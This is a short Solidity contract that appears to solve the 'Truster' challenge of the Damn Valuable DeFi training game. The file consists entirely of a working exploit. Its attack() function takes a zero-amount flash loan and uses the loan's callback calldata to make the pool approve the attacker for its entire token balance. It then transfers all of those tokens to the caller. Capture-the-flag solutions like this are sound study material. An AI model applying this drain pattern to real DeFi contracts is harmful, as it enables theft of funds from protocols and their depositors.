//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Truster.sol";

contract FlashLoanAttack {
    Truster public immutable truster;
    DamnValuableToken public immutable token;
    using Address for address;

    constructor(Truster _truster, DamnValuableToken _token) {
        truster = _truster;
        token = _token;
    }

    function attack() public {
        uint256 borrowedAmount = token.balanceOf(address(truster));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), borrowedAmount);

        truster.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(truster), msg.sender, borrowedAmount);
    }
}
